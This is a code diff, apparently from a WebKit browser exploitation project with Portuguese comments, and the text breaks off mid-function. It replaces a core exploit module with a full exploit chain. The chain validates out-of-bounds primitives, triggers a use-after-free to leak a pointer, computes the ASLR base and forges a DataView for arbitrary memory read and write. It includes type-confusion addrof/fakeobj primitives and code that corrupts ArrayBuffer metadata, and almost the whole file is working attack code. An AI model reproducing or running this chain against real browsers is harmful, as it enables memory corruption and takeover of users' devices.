@@ -1,46 +1,149 @@
-// js/core_exploit.mjs (v31.13 - Versão Completa e Corrigida - AGORA COM PRIMITIVAS ADDROF/FAKEOBJ DIRETAS E UNTAGGING DE JSVALUE)
+// js/script3/testArrayBufferVictimCrash.mjs (v152 - Refinamento do Spray UAF e Tamanho da Vítima - Agressivo)
+// =======================================================================================
+// ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
+// 1. Validar primitivas básicas (OOB local).
+// 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
+// 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
+// 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
+// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
+// =======================================================================================
 
-import { AdvancedInt64, PAUSE, toHex, log, setLogFunction, isAdvancedInt64Object } from './utils.mjs'; // ADICIONADO: isAdvancedInt64Object aqui
-import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import {
+    triggerOOB_primitive,
+    getOOBDataView,
+    clearOOBEnvironment,
+    addrof_core,
+    fakeobj_core,
+    initCoreAddrofFakeobjPrimitives,
+    arb_read, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
+    arb_write, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
+    selfTestOOBReadWrite,
+    oob_read_absolute,
+    oob_write_absolute
+} from '../core_exploit.mjs';
 
-export let oob_array_buffer_real = null;
-export let oob_dataview_real = null;
-let isOOBEnvironmentSetup = false;
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-// REMOVIDO: _local_isAdvancedInt64Object não é mais necessário aqui, pois isAdvancedInt64Object agora é importado diretamente.
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v152_AGRESSIVO";
 
-const toHexHelper = (val, bits = 32) => {
-    if (isAdvancedInt64Object(val)) { // Usando a função importada diretamente
-        try {
-            const strVal = val.toString(true);
-            if (typeof strVal === 'string' && strVal !== 'undefined') {
-                return strVal;
+// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
+const LOCAL_VERY_SHORT_PAUSE = 10;
+const LOCAL_SHORT_PAUSE = 100;
+const LOCAL_MEDIUM_PAUSE = 750; // Aumentado
+const LOCAL_LONG_PAUSE = 1500; // Aumentado
+
+let global_spray_objects = [];
+let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
+
+// Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
+let _fake_data_view = null;
+
+
+// Funções Auxiliares Comuns (dumpMemory)
+async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
+    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
+    const bytesPerRow = 16;
+    for (let i = 0; i < size; i += bytesPerRow) {
+        let hexLine = address.add(i).toString(true) + ": ";
+        let asciiLine = "  ";
+        let rowBytes = [];
+
+        for (let j = 0; j < bytesPerRow; j++) {
+            if (i + j < size) {
+                try {
+                    const byte = await arbReadFn(address.add(i + j), 1, logFn); // Note: logFn passado a arbReadFn
+                    rowBytes.push(byte);
+                    hexLine += byte.toString(16).padStart(2, '0') + " ";
+                    asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
+                } catch (e) {
+                    hexLine += "?? ";
+                    asciiLine += "?";
+                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
+                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
+                    break;
+                }
+            } else {
+                hexLine += "   ";
+                asciiLine += " ";
             }
-        } catch (e) { /* ignora, usa fallback */ }
-        return `AdvInt64(low:0x${val.low().toString(16)},high:0x${val.high().toString(16)})`;
+        }
+        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
     }
-    if (typeof val === 'number') {
-        return toHex(val, bits);
+    logFn(`[${sourceName}] Fim do dump.`, "debug");
+}
+
+export async function arb_read_universal_js_heap(address, byteLength, logFn) {
+    const FNAME = "arb_read_universal_js_heap";
+    if (!_fake_data_view) {
+        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
+        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
-    return String(val);
-};
+    const fake_ab_backing_addr = addrof_core(_fake_data_view);
+    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
-const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; // Assuming this is correct from config.mjs
-const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
-const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
-const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;
+    // Salvamos/restauramos o m_vector usando arb_read/arb_write (OOB local)
+    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8); 
+    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);
 
+    let result = null;
+    try {
+        switch (byteLength) {
+            case 1: result = _fake_data_view.getUint8(0); break;
+            case 2: result = _fake_data_view.getUint16(0, true); break;
+            case 4: result = _fake_data_view.getUint32(0, true); break;
+            case 8:
+                const low = _fake_data_view.getUint32(0, true);
+                const high = _fake_data_view.getUint32(4, true);
+                result = new AdvancedInt64(low, high);
+                break;
+            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
+        }
+    } finally {
+        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
+    }
+    return result;
+}
 
-// --- NEW CORE ADDROF/FAKEOBJ PRIMITIVES ---
-// These arrays will be managed internally by core_exploit.mjs
-let _core_confused_array_main = null;
-let _core_victim_array_main = null;
+export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
+    const FNAME = "arb_write_universal_js_heap";
+    if (!_fake_data_view) {
+        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
+        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
+    }
+    const fake_ab_backing_addr = addrof_core(_fake_data_view);
+    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
-const CONFUSED_FLOAT64_ARRAY_INDEX = 0; // Index in the confused array where the object's address/faked object's value will be stored
-const FAKED_OBJECT_INDEX = 0; // Index in the victim array where the faked object will appear
+    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
+    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);
 
-// Functions to convert between JS Double and AdvancedInt64
-function _int64ToDouble_core(int64) {
+    try {
+        switch (byteLength) {
+            case 1: _fake_data_view.setUint8(0, Number(value)); break;
+            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
+            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
+            case 8:
+                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
+                _fake_data_view.setUint32(0, val64.low(), true);
+                _fake_data_view.setUint32(4, val64.high(), true);
+                break;
+            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
+        }
+    } finally {
+        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
+    }
+    return value; // Retorna o valor escrito para consistência
+}
+
+// Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
+function _doubleToInt64_direct(double) {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = double;
+    const u32 = new Uint32Array(buf);
+    return new AdvancedInt64(u32[0], u32[1]);
+}
+
+function _int64ToDouble_direct(int64) {
     const buf = new ArrayBuffer(8);
     const u32 = new Uint32Array(buf);
     const f64 = new Float64Array(buf);
@@ -49,813 +152,525 @@ function _int64ToDouble_core(int64) {
     return f64[0];
 }
 
-function _doubleToInt64_core(double) {
-    const buf = new ArrayBuffer(8);
-    (new Float64Array(buf))[0] = double;
-    const u32 = new Uint32Array(buf);
-    return new AdvancedInt64(u32[0], u32[1]);
-}
-
 /**
- * Initializes the internal arrays for the core addrof and fakeobj primitives.
- * Must be called once before using `addrof_core` or `fakeobj_core`.
+ * Tenta configurar a primitiva de leitura/escrita arbitrária universal usando fakeobj com um dado m_mode.
+ * @param {Function} logFn Função de log.
+ * @param {Function} pauseFn Função de pausa.
+ * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
+ * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
+ * @param {number} m_mode_to_try O valor de m_mode a ser testado.
+ * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
  */
-export function initCoreAddrofFakeobjPrimitives() {
-    if (_core_confused_array_main && _core_victim_array_main) {
-        log(`[CoreExploit] Primitivas addrof/fakeobj diretas já estão configuradas.`, "info", "initCoreAddrofFakeobjPrimitives");
-        return;
-    }
-    _core_confused_array_main = new Float64Array([13.37]);
-    _core_victim_array_main = [{ a: 1 }];
+async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
+    const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
+    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);
 
-    log(`[CoreExploit] Primitivas addrof/fakeobj diretas inicializadas.`, "good", "initCoreAddrofFakeobjPrimitives");
-}
+    _fake_data_view = null;
+    let backing_array_buffer = null;
 
-/**
- * Obtains the address of a given JavaScript object using core primitives.
- * Includes "untagging" logic for JSValue pointers.
- * @param {object} obj The object to get the address of.
- * @returns {AdvancedInt64} The address of the object.
- */
-export function addrof_core(obj) {
-    const FNAME = 'CoreExploit.addrof_core';
-    if (!_core_confused_array_main || !_core_victim_array_main) {
-        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initCoreAddrofFakeobjPrimitives() primeiro.`, "critical", FNAME);
-        throw new Error("Core addrof/fakeobj primitives not initialized.");
-    }
-    if (!(_core_confused_array_main instanceof Float64Array)) {
-        log(`[${FNAME}] ERRO: _core_confused_array_main não é um Float64Array. Tipo: ${typeof _core_confused_array_main}`, "critical", FNAME);
-        throw new Error("Invalid internal array for addrof.");
-    }
-    if (!Array.isArray(_core_victim_array_main)) {
-        log(`[${FNAME}] ERRO: _core_victim_array_main não é um Array. Tipo: ${typeof _core_victim_array_main}`, "critical", FNAME);
-        throw new Error("Invalid internal array for addrof.");
-    }
-
-    _core_victim_array_main[FAKED_OBJECT_INDEX] = obj;
-    const tagged_addr = _doubleToInt64_core(_core_confused_array_main[CONFUSED_FLOAT64_ARRAY_INDEX]);
-    log(`[${FNAME}] DEBUG: Endereço bruto (potencialmente tagged) lido: ${tagged_addr.toString(true)}`, "debug", FNAME);
-
-    let untagged_addr = tagged_addr;
-    const original_high = tagged_addr.high();
-    const untagged_high = original_high & 0x0000FFFF;
-    if (original_high !== untagged_high) {
-        untagged_addr = new AdvancedInt64(tagged_addr.low(), untagged_high);
-        log(`[${FNAME}] DEBUG: Endereço após untagging (high original: 0x${original_high.toString(16)} -> high untagged: 0x${untagged_high.toString(16)}): ${untagged_addr.toString(true)}`, "debug", FNAME);
-    } else {
-        log(`[${FNAME}] DEBUG: Nenhum untagging aplicado (high original 0x${original_high.toString(16)}).`, "debug", FNAME);
-    }
-
-    if (!isAdvancedInt64Object(untagged_addr) || untagged_addr.equals(AdvancedInt64.Zero) || untagged_addr.equals(AdvancedInt64.NaNValue)) {
-        log(`[${FNAME}] FALHA: Endereço retornado para ${obj} (${untagged_addr ? untagged_addr.toString(true) : 'N/A'}) parece inválido ou nulo/NaN após untagging.`, "error", FNAME);
-        throw new Error(`Failed to get address of ${obj}. Invalid address.`);
-    }
-    log(`[${FNAME}] SUCESSO: Endereço (final, untagged) retornado para objeto ${obj} (tipo: ${typeof obj}): ${untagged_addr.toString(true)}`, "debug", FNAME);
-    return untagged_addr;
-}
-
-/**
- * Creates a "fake" JavaScript object at a given memory address using core primitives.
- * Includes "tagging" logic for JSValue pointers.
- * @param {AdvancedInt64} addr The memory address where the fake object should point.
- * @returns {object} The faked JavaScript object.
- */
-export function fakeobj_core(addr) {
-    const FNAME = 'CoreExploit.fakeobj_core';
-    if (!_core_confused_array_main || !_core_victim_array_main) {
-        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initCoreAddrofFakeobjPrimitives() primeiro.`, "critical", FNAME);
-        throw new Error("Core addrof/fakeobj primitives not initialized.");
-    }
-    if (!(_core_confused_array_main instanceof Float64Array)) {
-        log(`[${FNAME}] ERRO: _core_confused_array_main não é um Float64Array. Tipo: ${typeof _core_confused_array_main}`, "critical", FNAME);
-        throw new Error("Invalid internal array for fakeobj.");
-    }
-    if (!Array.isArray(_core_victim_array_main)) {
-        log(`[${FNAME}] ERRO: _core_victim_array_main não é um Array. Tipo: ${typeof _core_victim_array_main}`, "critical", FNAME);
-        throw new Error("Invalid internal array for fakeobj.");
-    }
-
-    if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
-        log(`[${FNAME}] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido ou nulo/NaN.`, "error", FNAME);
-        throw new Error(`Invalid address for fakeobj: ${addr.toString(true)}.`);
-    }
-
-    let tagged_addr = addr;
-    const OBJECT_PTR_TAG_HIGH = 0x402a0000;
-    if (addr.high() < 0x10000) {
-        tagged_addr = new AdvancedInt64(addr.low(), addr.high() | OBJECT_PTR_TAG_HIGH);
-        log(`[${FNAME}] DEBUG: Endereço após tagging (original: ${addr.toString(true)} -> tagged: ${tagged_addr.toString(true)})`, "debug", FNAME);
-    } else {
-        log(`[${FNAME}] DEBUG: Nenhum tagging aplicado ao high (0x${addr.high().toString(16)}). Assumindo que já está taggeado ou não precisa.`, "debug", FNAME);
-    }
-
-    _core_confused_array_main[CONFUSED_FLOAT64_ARRAY_INDEX] = _int64ToDouble_core(tagged_addr);
-    const obj = _core_victim_array_main[FAKED_OBJECT_INDEX];
-
-    if (obj === undefined || obj === null) {
-        log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser ser um objeto inválido.`, "warn", FNAME);
-    } else {
-        try {
-            const typeof_faked_obj = typeof obj;
-            if (typeof_faked_obj === 'number' || typeof_faked_obj === 'boolean' || typeof_faked_obj === 'string') {
-                 log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} não é um tipo de objeto (recebido: ${typeof_faked_obj}). Pode ser uma corrupção.`, "warn", FNAME);
-            } else {
-                 log(`[${FNAME}] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj} (typeof: ${typeof obj})`, "debug", FNAME);
-            }
-        } catch (e) {
-            log(`[${FNAME}] ALERTA: Erro ao inspecionar objeto forjado para ${addr.toString(true)}: ${e.message}`, "warn", FNAME);
-        }
-    }
-    return obj;
-}
-// --- END NEW CORE ADDROF/FAKEOBJ PRIMITIVES ---
-
-
-// Existing utility functions
-export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
-    oob_array_buffer_real = null;
-    oob_dataview_real = null;
-    isOOBEnvironmentSetup = false;
-    log(`[CoreExploit] Ambiente OOB limpo.`, "debug");
-}
-
-export function getOOBAllocationSize() {
-    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
-        updateOOBConfigFromUI(document);
-    }
-    return OOB_CONFIG.ALLOCATION_SIZE;
-}
-
-export function getBaseOffsetInDV() {
-    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
-        updateOOBConfigFromUI(document);
-    }
-    return OOB_CONFIG.BASE_OFFSET_IN_DV;
-}
-
-export function getInitialBufferSize() {
-    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
-        updateOOBConfigFromUI(document);
-    }
-    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
-}
-
-export async function triggerOOB_primitive(options = { force_reinit: false }) {
-    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
-    if (isOOBEnvironmentSetup && !options.force_reinit) {
-        let currentLength = 0;
-        try {
-            // Verificar a integridade do oob_dataview_real antes de reinit.
-            if (oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
-                currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true);
-            } else {
-                log(`[${FNAME_TRIGGER}] ALERTA: DataView ou ArrayBuffer real não estão válidos para verificação. Forçando re-inicialização.`, 'warn');
-                clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-            }
-        } catch (e) {
-            log(`[${FNAME_TRIGGER}] ERRO ao verificar estado do DataView: ${e.message}. Forçando re-inicialização.`, 'warn');
-            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-        }
-
-        if (oob_array_buffer_real && oob_dataview_real &&
-            oob_array_buffer_real.byteLength === getOOBAllocationSize() &&
-            oob_dataview_real.buffer === oob_array_buffer_real &&
-            currentLength === 0xFFFFFFFF) {
-            log(`[${FNAME_TRIGGER}] Ambiente OOB já configurado e expandido. Nenhuma ação necessária.`, 'info');
-            return true;
-        } else {
-            log(`[${FNAME_TRIGGER}] Ambiente OOB marcado como configurado, mas inconsistente/não expandido. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
-            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-        }
-    }
-    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
-    const currentAllocSize = getOOBAllocationSize();
-    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
-    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
     try {
-        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
-        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
+        backing_array_buffer = new ArrayBuffer(0x1000); // Tamanho suficiente para metadados
+        hold_objects.push(backing_array_buffer);
+        const backing_ab_addr = addrof_core(backing_array_buffer);
+        logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);
 
-        // Verificação adicional: garantir que o DataView está "conectado"
-        if (oob_dataview_real.buffer !== oob_array_buffer_real) {
-            const errorMsg = `[${FNAME_TRIGGER}] ERRO CRÍTICO: DataView não está associado ao ArrayBuffer real após criação!`;
-            log(errorMsg, 'critical', FNAME_TRIGGER);
-            throw new Error(errorMsg);
-        }
+        // AQUI ESTAMOS USANDO AS PRIMITIVAS ARB_READ/ARB_WRITE DO CORE_EXPLOIT (que funcionam localmente)
+        // PARA CORROMPER OS METADADOS DO 'backing_array_buffer'.
+        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
+        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8); // Ponteiro de dados para 0, para não colidir imediatamente
+        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4); // Tamanho máximo
+        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
+        logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);
 
-        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
-            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
-            log(`    m_length do oob_dataview_real expandido para 0xFFFFFFFF no offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`, 'info', FNAME_TRIGGER);
-        } else {
-            const errorMsg = `Falha ao expandir m_length: currentAllocSize (${currentAllocSize}) é muito pequeno para o offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`;
-            log(errorMsg, 'critical', FNAME_TRIGGER);
-            throw new Error(errorMsg);
-        }
-
-        log(`[${FNAME_TRIGGER}] Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
-        log(`    oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
-        log(`    oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true)} bytes (m_length expandido)`, 'info', FNAME_TRIGGER);
-        isOOBEnvironmentSetup = true;
-        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
-        return true;
-    } catch (e) {
-        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
-        console.error(e);
-        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-        throw e;
-    }
-}
-
-export function oob_read_absolute(offset_in_oob_buffer, byteLength) {
-    const FNAME_READ = 'CoreExploit.oob_read_absolute';
-    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) {
-        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_read_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_READ);
-        throw new Error("Ambiente OOB não inicializado/inválido para oob_read_absolute.");
-    }
-    // Adicionar verificação de 'detached' antes da operação, se possível.
-    // Em alguns motores, .buffer pode se tornar null ou byteLength 0 se estiver detached.
-    if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
-        log(`ERRO: DataView de OOB está detached/corrompido antes da leitura em ${toHex(offset_in_oob_buffer)}`, "critical", FNAME_READ);
-        isOOBEnvironmentSetup = false; // Marcar ambiente como não-funcional
-        throw new Error("OOB DataView is detached or corrupted.");
-    }
-
-    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_dataview_real.byteLength) {
-        const errorMsg = `oob_read_absolute (offset ${toHex(offset_in_oob_buffer)}, tam ${byteLength}) fora dos limites do oob_dataview_real (0-${oob_dataview_real.byteLength})`;
-        log(errorMsg, "error", FNAME_READ);
-        throw new RangeError(errorMsg);
-    }
-    try {
-        switch (byteLength) {
-            case 1: return oob_dataview_real.getUint8(offset_in_oob_buffer);
-            case 2: return oob_dataview_real.getUint16(offset_in_oob_buffer, true);
-            case 4: return oob_dataview_real.getUint32(offset_in_oob_buffer, true);
-            case 8: {
-                const low = oob_dataview_real.getUint32(offset_in_oob_buffer, true);
-                const high = oob_dataview_real.getUint32(offset_in_oob_buffer + 4, true);
-                const result = new AdvancedInt64(low, high);
-                return result;
-            }
-            default:
-                log(`ERRO: Tamanho de leitura inválido para oob_read_absolute: ${byteLength}`, "error", FNAME_READ);
-                throw new Error(`Invalid byteLength for oob_read_absolute: ${byteLength}`);
-        }
-    } catch (e) {
-        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_READ);
-        console.error(`[${FNAME_READ}] Exception: `, e);
-        if (e.message.includes("detached") || e.message.includes("out of bounds")) { isOOBEnvironmentSetup = false; }
-        throw e;
-    }
-}
-
-export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) {
-    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
-    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) {
-        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_write_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_WRITE);
-        throw new Error("Ambiente OOB não inicializado/inválido para oob_write_absolute.");
-    }
-    if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
-        log(`ERRO: DataView de OOB está detached/corrompido antes da escrita em ${toHex(offset_in_oob_buffer)}`, "critical", FNAME_WRITE);
-        isOOBEnvironmentSetup = false; // Marcar ambiente como não-funcional
-        throw new Error("OOB DataView is detached or corrupted.");
-    }
-    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_dataview_real.byteLength) {
-        const errorMsg = `oob_write_absolute (offset ${toHex(offset_in_oob_buffer)}, tam ${byteLength}) fora dos limites do oob_dataview_real (0-${oob_dataview_real.byteLength})`;
-        log(errorMsg, "error", FNAME_WRITE);
-        throw new RangeError(errorMsg);
-    }
-    try {
-        switch (byteLength) {
-            case 1: oob_dataview_real.setUint8(offset_in_oob_buffer, Number(value)); break;
-            case 2: oob_dataview_real.setUint16(offset_in_oob_buffer, Number(value), true); break;
-            case 4: oob_dataview_real.setUint32(offset_in_oob_buffer, Number(value), true); break;
-            case 8:
-                let val64 = value;
-                if (!isAdvancedInt64Object(val64)) { // Usando a função importada diretamente
-                    try { val64 = new AdvancedInt64(val64); } catch (convErr) {
-                        throw new TypeError(`Valor para oob_write_absolute de 8 bytes deve ser AdvancedInt64 ou conversível: ${convErr.message}`);
-                    }
-                    if (!isAdvancedInt64Object(val64)) { // Usando a função importada diretamente
-                        throw new TypeError(`Valor convertido para oob_write_absolute de 8 bytes não é um AdvancedInt64 válido.`);
-                    }
-                }
-                oob_dataview_real.setUint32(offset_in_oob_buffer, val64.low(), true);
-                oob_dataview_real.setUint32(offset_in_oob_buffer + 4, val64.high(), true);
-                break;
-            default:
-                log(`ERRO: Tamanho de escrita inválido para oob_write_absolute: ${byteLength}`, "error", FNAME_WRITE);
-                throw new Error(`Invalid byteLength for oob_write_absolute: ${byteLength}`);
-        }
-    } catch (e) {
-        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_WRITE);
-        if (e.message.includes("detached") || e.message.includes("out of bounds")) { isOOBEnvironmentSetup = false; }
-        throw e;
-    }
-}
-
-export function isOOBReady() {
-    let mLengthExpanded = false;
-    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) {
-        try {
-            // Verifica se o DataView ainda está "vivo" e conectado
-            if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
-                log(`[isOOBReady] DataView de OOB está detached/corrompido.`, "error");
-                isOOBEnvironmentSetup = false;
-                return false;
-            }
-            if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
-                mLengthExpanded = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF);
-            }
-        } catch (e) {
-            log(`[isOOBReady] Erro durante verificação de mLengthExpanded: ${e.message}`, "error");
-            mLengthExpanded = false;
-            isOOBEnvironmentSetup = false;
-        }
-    }
-    return isOOBEnvironmentSetup &&
-        oob_array_buffer_real instanceof ArrayBuffer &&
-        oob_dataview_real instanceof DataView &&
-        oob_array_buffer_real.byteLength > 0 &&
-        oob_dataview_real.buffer === oob_array_buffer_real &&
-        mLengthExpanded;
-}
-
-async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) {
-    const FNAME_RESET = `${fname_parent_for_log}._explicit_dv_reset`;
-    try {
-        // Tenta uma leitura/escrita simples para reativar o DataView após manipulação do m_vector
-        if (isOOBReady()) {
-            const temp_val = oob_read_absolute(0, 1);
-            oob_write_absolute(0, temp_val, 1);
-            log(`    [${FNAME_RESET}] DV reset explícito bem-sucedido.`, 'debug');
-        } else {
-            log(`    [${FNAME_RESET}] ALERTA: Não foi possível realizar reset explícito do DV, ambiente OOB não está pronto.`, 'warn');
-        }
-    } catch (e) {
-        log(`    [${FNAME_RESET}] ERRO durante o reset explícito do DV: ${e.message}`, 'error');
-        // Se o reset falhar, provavelmente o ambiente está seriamente corrompido.
-        isOOBEnvironmentSetup = false;
-    }
-}
-
-export async function arb_read(absolute_address, byteLength) {
-    const FNAME = 'CoreExploit.arb_read (v31.13)';
-    if (!isOOBReady()) {
-        log(`[${FNAME}] Ambiente OOB não está pronto para leitura arbitrária. Tentando re-inicializar...`, 'warn');
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) {
-            throw new Error("Ambiente OOB não pôde ser inicializado para leitura arbitrária.");
-        }
-    }
-    let addr64 = absolute_address;
-    if (!isAdvancedInt64Object(addr64)) { // Usando a função importada diretamente
-        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
-            throw new TypeError(`Endereço para arb_read deve ser AdvancedInt64 ou conversível: ${e.message}`);
-        }
-        if (!isAdvancedInt64Object(addr64)) { // Usando a função importada diretamente
